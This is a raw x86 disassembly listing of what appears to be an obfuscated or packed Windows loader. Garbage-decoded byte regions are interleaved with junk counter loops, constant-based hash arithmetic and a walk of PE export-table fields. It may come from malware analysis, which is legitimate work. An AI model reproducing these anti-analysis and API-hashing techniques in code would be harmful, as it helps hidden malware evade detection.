  407e13:	mov    cl,0xb9
  407e15:	int    0x86
  407e17:	aad    0x9e
  407e19:	jle    0x407e92
  407e1b:	das    
  407e1c:	mov    bh,0x35
  407e1e:	fwait
  407e1f:	je     0x407dd7
  407e21:	jmp    FWORD PTR [edx+0x44]
  407e24:	fwait
  407e25:	cmp    ch,ch
  407e27:	sub    cl,BYTE PTR [esi-0x51d2feae]
  407e2d:	dec    esp
  407e2e:	icebp  
  407e2f:	nop    DWORD PTR [esi]
  407e32:	pop    eax
  407e33:	dec    esi
  407e34:	out    dx,eax
  407e35:	add    DWORD PTR [edi-0x8686b91],esi
  407e3b:	fs popf 
  407e3d:	stc    
  407e3e:	pop    eax
  407e3f:	stos   DWORD PTR es:[edi],eax
  407e40:	add    eax,0x12a85379
  407e45:	inc    ebp
  407e46:	pop    edx
  407e47:	adc    ecx,DWORD PTR [edi+0x7d53fd71]
  407e4d:	dec    edx
  407e4e:	mov    al,ds:0xfcbd4685
  407e53:	mov    ecx,0x597de7ab
  407e58:	arpl   WORD PTR [edx-0x6fbc7b3d],ax
  407e5e:	xchg   esi,eax
  407e5f:	xchg   ecx,eax
  407e60:	jmp    0x407e77
  407e62:	ficomp WORD PTR [edi+0x5e7b1b5e]
  407e68:	xor    eax,0x5f9c85ba
  407e6d:	jbe    0x407eed
  407e6f:	shl    WORD PTR [edx],1
  407e72:	arpl   di,si
  407e74:	pop    edx
  407e75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e76:	repnz hlt 
  407e78:	rcl    DWORD PTR [ecx],1
  407e7a:	cmc    
  407e7b:	cs inc edx
  407e7d:	add    bh,ch
  407e7f:	(bad)  
  407e80:	in     al,0x6
  407e82:	inc    eax
  407e83:	and    BYTE PTR [ebx+0x7bee935d],0x98
  407e8a:	inc    ebx
  407e8b:	sbb    al,0xdc
  407e8d:	icebp  
  407e8e:	mov    ch,0x46
  407e90:	sub    ecx,ecx
  407e92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e93:	push   edi
  407e94:	or     DWORD PTR ds:0x936af3d,edi
  407e9a:	cdq    
  407e9b:	adc    al,0x75
  407e9d:	enter  0x9db8,0x11
  407ea1:	fdiv   QWORD PTR gs:[ecx]
  407ea4:	push   ebp
  407ea5:	stos   BYTE PTR es:[edi],al
  407ea6:	rcl    ch,cl
  407ea8:	fs push cs
  407eaa:	mov    ch,0x46
  407eac:	sub    edx,DWORD PTR [edi+0x1b]
  407eaf:	fdivrp st(5),st
  407eb1:	pop    ebx
  407eb2:	mov    ecx,0x81e0d2dd
  407eb7:	xor    BYTE PTR [edi-0x16d9af06],cl
  407ebd:	inc    esp
  407ebe:	std    
  407ebf:	(bad)  
  407ec0:	jmp    DWORD PTR [esi-0x75]
  407ec3:	inc    ebp
  407ec4:	cld    
  407ec5:	mov    edi,DWORD PTR [ebp+0x8]
  407ec8:	mov    edi,DWORD PTR [edi]
  407eca:	mov    edx,0x8a42
  407ecf:	xor    ax,dx
  407ed2:	mov    edx,0x3b08
  407ed7:	add    ax,dx
  407eda:	cmp    ax,WORD PTR [edi]
  407edd:	je     0x408061
  407ee3:	mov    eax,DWORD PTR [ebp-0x14]
  407ee6:	xor    eax,ecx
  407ee8:	jmp    0x40801f
  407eed:	(bad)  
  407eee:	pop    edx
  407eef:	fst    st(3)
  407ef1:	jge    0x407f46
  407ef3:	out    0x5d,al
  407ef5:	jnp    0x407ee7
  407ef7:	inc    esi
  407ef8:	sub    DWORD PTR [eax+0x19],esi
  407efb:	lods   eax,DWORD PTR ds:[esi]
  407efc:	dec    ebp
  407efd:	(bad)  
  407eff:	jl     0x407f7d
  407f01:	push   es
  407f02:	jg     0x407f80
  407f04:	jl     0x407f53
  407f06:	xor    eax,ecx
  407f08:	in     eax,0x2
  407f0a:	ja     0x407ea3
  407f0c:	lock arpl WORD PTR [ebp+eax*4-0x6e7597c1],bx
  407f14:	retf   
  407f15:	xor    al,ah
  407f17:	inc    ebx
  407f18:	pop    ss
  407f19:	mov    al,0xe7
  407f1b:	sbb    DWORD PTR [edi],ebx
  407f1d:	jmp    0xb393c06a
  407f22:	add    eax,0xc1d26ee9
  407f27:	js     0x407eb2
  407f29:	das    
  407f2a:	ins    DWORD PTR es:[edi],dx
  407f2b:	das    
  407f2c:	push   ecx
  407f2d:	xlat   BYTE PTR ds:[ebx]
  407f2e:	outs   dx,BYTE PTR ds:[esi]
  407f2f:	int    0x23
  407f31:	shl    al,1
  407f33:	xchg   ebp,eax
  407f34:	xchg   BYTE PTR [edx+0x13],dl
  407f37:	adc    dh,ch
  407f39:	test   edi,0xf35e547b
  407f3f:	mov    ebx,0x832631f1
  407f44:	dec    ebx
  407f45:	data16 (bad) 
  407f47:	je     0x407ed4
  407f49:	adc    BYTE PTR [ebx-0x5],al
  407f4c:	mov    ebp,0x2c22c6c
  407f51:	sub    ebx,DWORD PTR ds:0xc76cbe07
  407f57:	cmp    eax,0x8bfad01c
  407f5c:	out    0x4c,eax
  407f5e:	jle    0x407f8d
  407f60:	mov    ecx,DWORD PTR [eax+0x17]
  407f63:	daa    
  407f64:	jecxz  0x407fc6
  407f66:	cdq    
  407f67:	aaa    
  407f68:	sbb    dh,BYTE PTR [edi]
  407f6a:	mov    ?,WORD PTR [edx-0x2eea83af]
  407f70:	aam    0x15
  407f72:	sahf   
  407f73:	mov    ebp,0xa8b2e5df
  407f78:	inc    ebx
  407f79:	xor    BYTE PTR [ecx],bh
  407f7b:	xor    ebx,DWORD PTR [eax-0x2afe998d]
  407f81:	lahf   
  407f82:	push   ebp
  407f83:	lock dec esp
  407f85:	aas    
  407f86:	out    0x86,al
  407f88:	aad    0x83
  407f8a:	mov    ch,0xb2
  407f8c:	xor    eax,0x29e55ec
  407f91:	xchg   edx,eax
  407f92:	enter  0x4315,0x7
  407f96:	mov    dh,0x7a
  407f98:	aad    0x6a
  407f9a:	or     BYTE PTR [edx],0xd2
  407f9d:	sbb    BYTE PTR [eax],0x11
  407fa0:	clc    
  407fa1:	cmp    eax,0x5ce25b49
  407fa6:	lea    edx,[ebx]
  407fa8:	adc    bh,BYTE PTR [edx+0x26]
  407fab:	adc    ebp,DWORD PTR ds:0x5f7f6646
  407fb1:	jae    0x408016
  407fb3:	and    ebp,ecx
  407fb5:	daa    
  407fb6:	push   0xd8596053
  407fbb:	loopne 0x407f79
  407fbd:	ds xchg ebx,eax
  407fbf:	std    
  407fc0:	popf   
  407fc1:	push   ecx
  407fc2:	sbb    DWORD PTR [edi+0x53109352],edi
  407fc8:	pop    edx
  407fc9:	cmp    BYTE PTR [ebx-0x2c82eff2],bh
  407fcf:	mul    BYTE PTR [edi]
  407fd1:	xchg   edi,eax
  407fd2:	adc    DWORD PTR [ebx+0x3eb5e75b],ebp
  407fd8:	and    al,0x26
  407fda:	xor    BYTE PTR [eax-0x74750ac8],0x93
  407fe1:	push   ecx
  407fe2:	inc    bl
  407fe4:	retf   0x9020
  407fe7:	sub    BYTE PTR [edi-0x75],0xda
  407feb:	aam    0x29
  407fed:	push   ecx
  407fee:	add    bh,BYTE PTR fs:[esi-0x3b]
  407ff2:	iret   
  407ff3:	rol    DWORD PTR [eiz*8-0x1329c307],cl
  407ffa:	fst    DWORD PTR [ecx-0x76e3d278]
  408000:	pop    es
  408001:	sub    ebp,DWORD PTR [ecx-0x47]
  408004:	inc    ebp
  408005:	repz dec ecx
  408007:	imul   ebp,edi,0xafb7d391
  40800d:	jecxz  0x408066
  40800f:	(bad)  
  408010:	push   eax
  408011:	stos   DWORD PTR es:[edi],eax
  408012:	addr16 pop ebp
  408014:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408015:	or     BYTE PTR [ebx+0x469d8735],al
  40801b:	js     0x407ff6
  40801d:	hlt    
  40801e:	jmp    0x45ca4626
  408023:	fmul   QWORD PTR [ebx-0x749927bb]
  408029:	jge    0x407fff
  40802b:	mov    ebx,0x8a42
  408030:	xor    di,bx
  408033:	add    di,dx
  408036:	movzx  edx,di
  408039:	mov    edi,DWORD PTR [ebp-0x8]
  40803c:	xor    edi,ecx
  40803e:	lea    edx,[edx+edi*1+0x32729e]
  408045:	add    DWORD PTR [eax],edx
  408047:	mov    eax,DWORD PTR [ebp-0x20]
  40804a:	mov    edx,DWORD PTR [ebp-0x8]
  40804d:	mov    edi,DWORD PTR [ebp-0x24]
  408050:	xor    edx,ecx
  408052:	add    edx,esi
  408054:	imul   edx,edi
  408057:	sub    DWORD PTR [eax],edx
  408059:	mov    eax,DWORD PTR [ebp-0x14]
  40805c:	jmp    0x407c08
  408061:	mov    eax,DWORD PTR [ebp-0xc]
  408064:	mov    edx,DWORD PTR [ebp-0x18]
  408067:	xor    eax,edx
  408069:	cmp    eax,0xe77c698d
  40806e:	je     0x407c05
  408074:	mov    eax,DWORD PTR [ebp-0x10]
  408077:	add    DWORD PTR [eax],0x7403501
  40807d:	jmp    0x407c05
  408082:	mov    eax,DWORD PTR [ebp-0x1c]
  408085:	cmp    DWORD PTR [eax],edi
  408087:	je     0x407c05
  40808d:	mov    eax,0x800f1c9c
  408092:	jmp    0x407c0c
  408097:	push   ebp
  408098:	mov    ebp,esp
  40809a:	push   ecx
  40809b:	xor    eax,eax
  40809d:	push   ecx
  40809e:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  4080a5:	sub    edx,0x2ef1
  4080ab:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  4080b2:	xor    ecx,ecx
  4080b4:	or     ecx,DWORD PTR ds:0x44e420
  4080ba:	sbb    ecx,DWORD PTR ds:0x410753
  4080c0:	mov    DWORD PTR ds:0x44e420,ecx
  4080c6:	mov    eax,DWORD PTR [ebp-0x4]
  4080c9:	dec    DWORD PTR ds:0x410753
  4080cf:	push   esi
  4080d0:	add    DWORD PTR ds:0x44b6cc,0x9cd
  4080da:	mov    esi,DWORD PTR [ebp-0x8]
  4080dd:	xor    ecx,0x7d4d
  4080e3:	mov    edx,0x7510857
  4080e8:	xor    eax,edx
  4080ea:	adc    DWORD PTR ds:0x4247ce,0x7d5d
  4080f4:	xor    esi,edx
  4080f6:	and    DWORD PTR ds:0x44e410,0x0
  408100:	mov    ecx,DWORD PTR ds:0x44e410
  408106:	inc    ecx
  408107:	mov    DWORD PTR ds:0x44e410,ecx
  40810d:	cmp    DWORD PTR ds:0x44e410,0x1b
  408114:	jne    0x408125
  40811a:	push   0x410845
  40811f:	call   DWORD PTR ds:0x443378
  408125:	cmp    DWORD PTR ds:0x44e410,0x13
  40812c:	jb     0x408100
  408132:	mov    ecx,0x32729e
  408137:	add    esi,ecx
  408139:	jmp    0x4081e2
  40813e:	xchg   esp,eax
  40813f:	and    al,ch
  408141:	and    al,0x5d
  408143:	out    0x6d,eax
  408145:	mov    ds:0x3d17a190,al
  40814a:	add    dl,BYTE PTR [ecx]
  40814c:	mov    es,esp
  40814e:	out    0xcb,eax
  408150:	jl     0x4081ce
  408152:	mov    BYTE PTR [esp+edi*2+0x7c],bh
  408156:	loope  0x4080e3
  408158:	call   0xb829:0xc6f8671
  40815f:	mov    BYTE PTR [esi-0x325cce99],cl
  408165:	and    eax,0xb8eab4db
  40816a:	pop    ebp
  40816b:	add    ah,dl
  40816d:	jno    0x408109
  40816f:	sbb    DWORD PTR [eax],eax
  408171:	pop    ebp
  408172:	and    ecx,esi
  408174:	add    BYTE PTR [ebx+0x551d049],bh
  40817a:	loope  0x408114
  40817c:	inc    ebp
  40817d:	jo     0x408107
  40817f:	xchg   ebx,eax
  408180:	add    DWORD PTR [esi-0xb273384],esp
  408186:	enter  0x37c5,0x8d
  40818a:	jae    0x4081c2
  40818c:	ret    
  40818d:	cdq    
  40818e:	cld    
  40818f:	push   ecx
  408190:	inc    ebp
  408191:	jp     0x4081b8
  408193:	xchg   DWORD PTR [esi+0x4cf68f86],esi
  408199:	not    bh
  40819b:	jp     0x408130
  40819d:	mov    esi,0xaa42673c
  4081a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081a3:	inc    ecx
  4081a4:	outs   dx,BYTE PTR ds:[esi]
  4081a5:	jle    0x408179
  4081a7:	dec    ebx
  4081a8:	repz sti 
  4081aa:	jo     0x408181
  4081ac:	xchg   esi,eax
  4081ad:	jg     0x4081c4
  4081af:	outs   dx,DWORD PTR ds:[esi]
  4081b0:	add    eax,0xb44b2e0
  4081b5:	inc    edi
  4081b6:	add    eax,0xa818eb5e
  4081bb:	inc    ebx
  4081bc:	popa   
  4081bd:	inc    ecx
  4081be:	add    edx,0xffffffe2
  4081c1:	push   ebp
  4081c2:	sub    al,0x2b
  4081c4:	cli    
  4081c5:	pop    es
  4081c6:	mov    al,ds:0xefa5cdb3
  4081cb:	cld    
  4081cc:	mov    ebp,0x5a700b0f
  4081d1:	sub    dh,BYTE PTR [edx+0xd]
  4081d4:	sbb    edx,DWORD PTR [ecx-0x11]
  4081d7:	pop    ebx
  4081d8:	adc    BYTE PTR [ebx+ecx*8+0x3e],cl
  4081dc:	xor    ecx,esi
  4081de:	pusha  
  4081df:	inc    esp
  4081e0:	push   ecx
  4081e1:	clc    
  4081e2:	add    eax,ecx
  4081e4:	imul   eax,esi
  4081e7:	mov    esi,DWORD PTR [ebp+0xc]
  4081ea:	mov    DWORD PTR ds:0x44b6d0,0x538a
  4081f4:	cmp    esi,eax
  4081f6:	jne    0x40826b
  4081fc:	mov    DWORD PTR ds:0x44b6d4,0x1c
  408206:	cmp    DWORD PTR ds:0x44b6d4,0x0
  40820d:	je     0x408255
  408213:	cmp    DWORD PTR ds:0x44b6d4,0xe
  40821a:	jne    0x408229
  408220:	push   DWORD PTR [ebp-0x14]
  408223:	call   DWORD PTR ds:0x44301c
  408229:	cmp    DWORD PTR ds:0x44b6d4,0xf
  408230:	jne    0x408243
  408236:	mov    esi,DWORD PTR ds:0x44b6d4
  40823c:	dec    esi
  40823d:	mov    DWORD PTR ds:0x44b6d4,esi
  408243:	mov    esi,DWORD PTR ds:0x44b6d4
  408249:	dec    esi
  40824a:	mov    DWORD PTR ds:0x44b6d4,esi
  408250:	jmp    0x408206
  408255:	mov    eax,DWORD PTR [ebp-0x4]
  408258:	mov    esi,DWORD PTR [ebp-0x8]
  40825b:	xor    eax,edx
  40825d:	xor    esi,edx
  40825f:	add    eax,ecx
  408261:	add    esi,ecx
  408263:	imul   eax,esi
  408266:	jmp    0x40834f
  40826b:	mov    eax,DWORD PTR [ebp+0xc]
  40826e:	mov    eax,DWORD PTR [eax+0x78]
  408271:	mov    DWORD PTR [ebp+0xc],eax
  408274:	mov    eax,DWORD PTR [ebp-0x4]
  408277:	mov    esi,DWORD PTR [ebp-0x8]
  40827a:	xor    eax,edx
  40827c:	xor    esi,edx
  40827e:	jmp    0x408327
  408283:	mov    edi,0x6a6fd0cd
  408288:	jns    0x4082cd
  40828a:	std    
  40828b:	ficomp WORD PTR [ebx+0x10]
  40828e:	jo     0x40821d
  408290:	jge    0x4082f8
  408292:	clc    
  408293:	jae    0x40825f
  408295:	jl     0x408313
  408297:	mov    BYTE PTR [esp+edi*2+0x7c],bh
  40829b:	adc    esi,ecx
  40829d:	mov    al,gs:0xffb4f3cf
  4082a3:	pop    edx
  4082a4:	lahf   
  4082a5:	fsub   DWORD PTR [eax+edi*1]
  4082a8:	mov    cl,0xce
  4082aa:	add    eax,0x7c8cf915
  4082af:	dec    BYTE PTR [edi]
  4082b1:	loop   0x408291
  4082b3:	sub    eax,0x8a91b8ed
  4082b8:	adc    BYTE PTR [ebx],cl
  4082ba:	pushf  
  4082bb:	jb     0x40824d
  4082bd:	pop    DWORD PTR [edx+0x7ebb0d7f]
  4082c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082c4:	xor    bl,BYTE PTR [ebx+0x2ce37442]
  4082ca:	push   edx
  4082cb:	add    eax,0x9e5a83ca
  4082d0:	das    
  4082d1:	inc    ebx
  4082d2:	xchg   esp,eax
  4082d3:	jmp    0x55cc:0xe7771c3f
  4082da:	pushf  
  4082db:	addr16 xchg ebp,eax
  4082dd:	popa   
  4082de:	or     bh,bl
  4082e0:	sahf   
  4082e1:	stos   DWORD PTR es:[edi],eax
  4082e2:	fbstp  TBYTE PTR [edi]
  4082e4:	test   BYTE PTR [esi],ah
  4082e6:	and    al,0xd0
  4082e8:	lods   al,BYTE PTR ds:[esi]
  4082e9:	cmp    DWORD PTR [edx+0x1533370],ebp
  4082ef:	mov    al,0xb2
  4082f1:	jo     0x4082ce
  4082f3:	or     DWORD PTR [ecx],esi
  4082f5:	push   ss
  4082f6:	xchg   ebp,eax
  4082f7:	ror    bl,0x2c
  4082fa:	sbb    DWORD PTR [ebx+0x29b20bb1],edi
  408300:	pop    ds
  408301:	and    al,0x11
  408303:	or     ch,BYTE PTR [ecx-0x73]
  408306:	pusha  
  408307:	scas   al,BYTE PTR es:[edi]
  408308:	adc    ebp,DWORD PTR [eax+0x25]
  40830b:	addr16 sahf 
  40830d:	dec    edi
  40830e:	xlat   BYTE PTR ds:[ebx]
  40830f:	pop    ds
  408310:	jmp    0xe7b1fb57
  408315:	jno    0x408371
  408317:	adc    BYTE PTR [edx-0x3f25f302],bl
  40831d:	cmc    
  40831e:	cwde   
  40831f:	scas   al,BYTE PTR es:[edi]
  408320:	imul   esi,DWORD PTR [edx+ecx*8-0x1b],0x3517df5
  408328:	rol    DWORD PTR [ebx],0xf1
  40832b:	imul   eax,esi
  40832e:	mov    esi,DWORD PTR [ebp+0xc]
  408331:	cmp    esi,eax
  408333:	mov    eax,DWORD PTR [ebp-0x4]
  408336:	je     0x408258
  40833c:	xor    eax,edx
  40833e:	add    eax,ecx
  408340:	mov    ecx,DWORD PTR [ebp+0xc]
  408343:	imul   eax,ecx
  408346:	add    eax,DWORD PTR [ebp+0x8]
  408349:	mov    DWORD PTR [ebp+0xc],eax
  40834c:	mov    eax,DWORD PTR [ebp+0xc]
  40834f:	pop    esi
  408350:	leave  
  408351:	ret    0x8
  408354:	push   ebp
  408355:	mov    ebp,esp
  408357:	sub    esp,0xa0
  40835d:	push   0x4452b8
  408362:	xor    DWORD PTR ds:0x44e418,0x56f9
  40836c:	call   DWORD PTR ds:0x4430a0
  408372:	adc    DWORD PTR ds:0x448980,0x4247da
  40837c:	test   eax,eax
  40837e:	mov    DWORD PTR ds:0x448984,0xdf5
  408388:	je     0x40839f
  40838e:	or     DWORD PTR ds:0x44b6e4,0x448990
  408398:	xor    eax,eax
  40839a:	jmp    0x409294
  40839f:	sub    DWORD PTR ds:0x44b6dc,0x44899c
  4083a9:	push   esi
  4083aa:	and    DWORD PTR ds:0x4247da,0x0
  4083b4:	jmp    0x4083c6
  4083b9:	mov    esi,DWORD PTR ds:0x4247da
  4083bf:	inc    esi
  4083c0:	mov    DWORD PTR ds:0x4247da,esi
  4083c6:	cmp    DWORD PTR ds:0x4247da,0x1f
  4083cd:	jae    0x408414
  4083d3:	cmp    DWORD PTR ds:0x4247da,0x9
  4083da:	jne    0x4083eb
  4083e0:	push   0x3309
  4083e5:	call   DWORD PTR ds:0x44337c
  4083eb:	cmp    DWORD PTR ds:0x4247da,0x8
  4083f2:	jne    0x408405
  4083f8:	mov    esi,DWORD PTR ds:0x4247da
  4083fe:	inc    esi
  4083ff:	mov    DWORD PTR ds:0x4247da,esi
  408405:	jmp    0x4083b9
  40840a:	or     DWORD PTR ds:0x44b6e0,0x7a7b
  408414:	mov    esi,0x876987
  408419:	mov    DWORD PTR ds:0x448990,0x1efc
  408423:	push   esi
  408424:	push   0x4452fc
  408429:	push   0x445324
  40842e:	call   DWORD PTR ds:0x443370
  408434:	mov    DWORD PTR ds:0x44e424,0x50e
  40843e:	cmp    eax,esi
  408440:	je     0x4084a1
  408446:	or     DWORD PTR ds:0x448980,0x78e6
  408450:	push   0x98786856
  408455:	add    DWORD PTR ds:0x4247d2,0x6d32
  40845f:	push   0x344
  408464:	adc    DWORD PTR ds:0x41074f,0x5b99
  40846e:	push   0x545
  408473:	adc    DWORD PTR ds:0x44899c,0x2d37
  40847d:	push   0x675765
  408482:	sbb    DWORD PTR ds:0x410743,0x4247da
  40848c:	push   0x67576
  408491:	push   0x86789768
  408496:	call   DWORD PTR ds:0x443368
  40849c:	jmp    0x409293
  4084a1:	or     edx,0x6156
  4084a7:	mov    ecx,0xf89c8535
  4084ac:	and    esi,0x7fd
  4084b2:	mov    DWORD PTR [ebp-0x20],ecx
  4084b5:	sub    esi,0x48f6
  4084bb:	mov    DWORD PTR [ebp-0x18],0xf89c8534
  4084c2:	lea    eax,[ebp-0x4c]
  4084c5:	adc    DWORD PTR ds:0x44e424,ebx
  4084cb:	mov    DWORD PTR [ebp-0x30],eax
  4084ce:	add    esi,DWORD PTR ds:0x4489a0
  4084d4:	lea    eax,[ebp-0x54]
  4084d7:	mov    DWORD PTR [ebp-0x14],eax
  4084da:	mov    DWORD PTR ds:0x4489a4,0x12
  4084e4:	cmp    DWORD PTR ds:0x4489a4,0x0
  4084eb:	je     0x40853a
  4084f1:	cmp    DWORD PTR ds:0x4489a4,0x6
  4084f8:	jne    0x408509
  4084fe:	push   0x8a27
  408503:	call   DWORD PTR ds:0x443380
  408509:	cmp    DWORD PTR ds:0x4489a4,0x7
  408510:	jne    0x408521
  408516:	mov    eax,ds:0x4489a4
  40851b:	dec    eax
  40851c:	mov    ds:0x4489a4,eax
  408521:	xor    eax,eax
  408523:	xor    eax,DWORD PTR ds:0x4489a4
  408529:	dec    eax
  40852a:	mov    ds:0x4489a4,eax
  40852f:	jmp    0x4084e4
  408534:	sbb    esi,DWORD PTR ds:0x44e418
  40853a:	mov    eax,ds:0x4451a0
  40853f:	and    DWORD PTR ds:0x44e414,0x0
  408549:	jmp    0x40855b
  40854e:	mov    esi,DWORD PTR ds:0x44e414
  408554:	inc    esi
  408555:	mov    DWORD PTR ds:0x44e414,esi
  40855b:	cmp    DWORD PTR ds:0x44e414,0x16
  408562:	jae    0x4085a2
  408568:	cmp    DWORD PTR ds:0x44e414,0x1d
  40856f:	jne    0x40858a
  408575:	push   0x61c5
  40857a:	push   0x7b2c
  40857f:	push   0x2e55
  408584:	call   DWORD PTR ds:0x443384
  40858a:	jmp    0x40854e
  40858f:	movzx  edx,WORD PTR ds:0x44b6e0
  408596:	sbb    edx,DWORD PTR ds:0x4247d6
  40859c:	mov    DWORD PTR ds:0x44b6e0,edx
  4085a2:	mov    eax,DWORD PTR [eax+0x1c8]
  4085a8:	xor    edx,edx
  4085aa:	mov    eax,DWORD PTR [eax]
  4085ac:	mov    DWORD PTR ds:0x44e428,0x299a
  4085b6:	mov    edx,DWORD PTR [ebp-0x14]
  4085b9:	and    DWORD PTR ds:0x44e414,0x0
  4085c3:	xor    esi,esi
  4085c5:	add    esi,DWORD PTR ds:0x44e414
  4085cb:	inc    esi
  4085cc:	mov    DWORD PTR ds:0x44e414,esi
  4085d2:	cmp    DWORD PTR ds:0x44e414,0x27
  4085d9:	jne    0x4085f1
  4085df:	push   0x7f38
  4085e4:	push   0x1
  4085e6:	push   0x41098d
  4085eb:	call   DWORD PTR ds:0x443388
  4085f1:	cmp    DWORD PTR ds:0x44e414,0x1d
  4085f8:	jb     0x4085c3
  4085fe:	and    DWORD PTR ds:0x44b6d4,0x0
  408608:	xor    esi,esi
  40860a:	add    esi,DWORD PTR ds:0x44b6d4
  408610:	inc    esi
  408611:	mov    DWORD PTR ds:0x44b6d4,esi
  408617:	cmp    DWORD PTR ds:0x44b6d4,0xa
  40861e:	jne    0x40862f
  408624:	push   0x40b4
  408629:	call   DWORD PTR ds:0x4430ec
  40862f:	cmp    DWORD PTR ds:0x44b6d4,0x9
  408636:	jne    0x408649
  40863c:	mov    esi,DWORD PTR ds:0x44b6d4
  408642:	inc    esi
  408643:	mov    DWORD PTR ds:0x44b6d4,esi
  408649:	cmp    DWORD PTR ds:0x44b6d4,0x1b
  408650:	jb     0x408608
  408656:	or     DWORD PTR ds:0x4489a0,0x1250
  408660:	push   ebx
  408661:	movzx  esi,BYTE PTR ds:0x448990
  408668:	sub    esi,DWORD PTR ds:0x4247d2
  40866e:	mov    DWORD PTR ds:0x448990,esi
  408674:	mov    esi,0x7510857
  408679:	mov    DWORD PTR ds:0x4247d2,0x4f36
  408683:	xor    eax,esi
  408685:	sub    DWORD PTR ds:0x44e40c,0x44b6e8
  40868f:	push   edi
  408690:	mov    DWORD PTR ds:0x448990,0x1b
  40869a:	cmp    DWORD PTR ds:0x448990,0x0
  4086a1:	je     0x408750
  4086a7:	cmp    DWORD PTR ds:0x448990,0xd
  4086ae:	jne    0x4086c9
  4086b4:	push   0x7f5c
  4086b9:	push   0x1
  4086bb:	push   DWORD PTR [ebp-0x18]
  4086be:	push   0x52f7
  4086c3:	call   DWORD PTR ds:0x4430f0
  4086c9:	cmp    DWORD PTR ds:0x448990,0xe
  4086d0:	jne    0x4086e3
  4086d6:	mov    edi,DWORD PTR ds:0x448990
  4086dc:	dec    edi
  4086dd:	mov    DWORD PTR ds:0x448990,edi
  4086e3:	mov    edi,DWORD PTR ds:0x448990
  4086e9:	dec    edi
  4086ea:	mov    DWORD PTR ds:0x448990,edi
  4086f0:	jmp    0x40869a
  4086f5:	and    DWORD PTR ds:0x44e428,0x0
  4086ff:	mov    edi,DWORD PTR ds:0x44e428
  408705:	inc    edi
  408706:	mov    DWORD PTR ds:0x44e428,edi
  40870c:	cmp    DWORD PTR ds:0x44e428,0x9
  408713:	jne    0x408729
  408719:	push   0x3065
  40871e:	push   0x34da
  408723:	call   DWORD PTR ds:0x44338c
  408729:	cmp    DWORD PTR ds:0x44e428,0x8
  408730:	jne    0x408743
  408736:	mov    edi,DWORD PTR ds:0x44e428
  40873c:	inc    edi
  40873d:	mov    DWORD PTR ds:0x44e428,edi
  408743:	cmp    DWORD PTR ds:0x44e428,0x12
  40874a:	jb     0x4086ff
  408750:	mov    edi,0x32729e
  408755:	sbb    DWORD PTR ds:0x44e424,0x410753
  40875f:	add    eax,edi
  408761:	mov    DWORD PTR [edx],eax
  408763:	movzx  eax,BYTE PTR ds:0x44b6cc
  40876a:	mov    eax,ds:0x44541c
  40876f:	cmp    eax,0x23d14057
  408774:	mov    DWORD PTR ds:0x4247ca,0x37ed
  40877e:	mov    eax,DWORD PTR [ebp-0x18]
  408781:	mov    DWORD PTR ds:0x44b6e4,0x441f
  40878b:	je     0x4087a5
  408791:	neg    ecx
  408793:	mov    ecx,DWORD PTR [ebp-0x20]
  408796:	xor    eax,esi
  408798:	add    eax,edi
  40879a:	imul   eax,ecx
  40879d:	mov    DWORD PTR [ebp-0x20],eax
  4087a0:	jmp    0x40903b
  4087a5:	xor    edx,DWORD PTR ds:0x44b6cc
  4087ab:	xor    eax,esi
  4087ad:	add    eax,edi
  4087af:	and    DWORD PTR ds:0x448994,0x0
  4087b9:	mov    edx,DWORD PTR ds:0x448994
  4087bf:	inc    edx
  4087c0:	mov    DWORD PTR ds:0x448994,edx
  4087c6:	cmp    DWORD PTR ds:0x448994,0x1c
  4087cd:	jne    0x4087eb
  4087d3:	push   0x41098d
  4087d8:	push   0x5d39
  4087dd:	push   DWORD PTR [ebp-0x18]
  4087e0:	push   0x7a56
  4087e5:	call   DWORD PTR ds:0x443390
  4087eb:	cmp    DWORD PTR ds:0x448994,0x11
  4087f2:	jb     0x4087b9
  4087f8:	mov    ds:0x4452b0,eax
  4087fd:	mov    eax,DWORD PTR [ebp-0x20]
  408800:	xor    eax,esi
  408802:	inc    edx
  408803:	add    eax,edi
  408805:	movzx  edx,BYTE PTR ds:0x44b6e4
  40880c:	sub    edx,DWORD PTR ds:0x44898c
  408812:	mov    DWORD PTR ds:0x44b6e4,edx
  408818:	mov    ds:0x44541c,eax
  40881d:	mov    eax,DWORD PTR [ebp-0x18]
  408820:	or     DWORD PTR ds:0x41074b,0x6341
  40882a:	mov    edx,DWORD PTR ds:0x4452b0
  408830:	sbb    DWORD PTR ds:0x44899c,0x44b6e8
  40883a:	xor    eax,esi
  40883c:	sbb    DWORD PTR ds:0x44b6d4,0x68
  408846:	add    eax,edi
  408848:	mov    DWORD PTR ds:0x44b6e0,0x7dde
  408852:	cmp    edx,eax
  408854:	jne    0x40903b
  40885a:	mov    eax,DWORD PTR [ebp-0x18]
  40885d:	sbb    ebx,edx
  40885f:	mov    DWORD PTR [ebp-0x28],eax
  408862:	xor    eax,eax
  408864:	add    eax,DWORD PTR ds:0x4454e0
  40886a:	mov    ebx,DWORD PTR ds:0x4454ec
  408870:	sub    eax,ebx
  408872:	add    eax,DWORD PTR [eax+ebx*1]
  408875:	mov    eax,DWORD PTR [ebp-0x20]
  408878:	mov    DWORD PTR [ebp-0x1c],eax
  40887b:	mov    eax,ds:0x4451a0
  408880:	and    DWORD PTR ds:0x4489a4,0x0
  40888a:	mov    ebx,DWORD PTR ds:0x4489a4
  408890:	inc    ebx
  408891:	mov    DWORD PTR ds:0x4489a4,ebx
  408897:	cmp    DWORD PTR ds:0x4489a4,0x21
  40889e:	jne    0x4088b5
  4088a4:	push   0x32f9
  4088a9:	push   DWORD PTR [ebp-0x20]
  4088ac:	push   DWORD PTR [ebp-0x18]
  4088af:	call   DWORD PTR ds:0x4430f4
  4088b5:	cmp    DWORD PTR ds:0x4489a4,0x13
  4088bc:	jb     0x40888a
  4088c2:	mov    DWORD PTR ds:0x44b6e8,0x1c
  4088cc:	cmp    DWORD PTR ds:0x44b6e8,0x0
  4088d3:	je     0x408985
  4088d9:	cmp    DWORD PTR ds:0x44b6e8,0xe
  4088e0:	jne    0x4088ef
  4088e6:	push   DWORD PTR [ebp-0x24]
  4088e9:	call   DWORD PTR ds:0x4430f8
  4088ef:	cmp    DWORD PTR ds:0x44b6e8,0xf
  4088f6:	jne    0x40890b
  4088fc:	xor    edx,edx
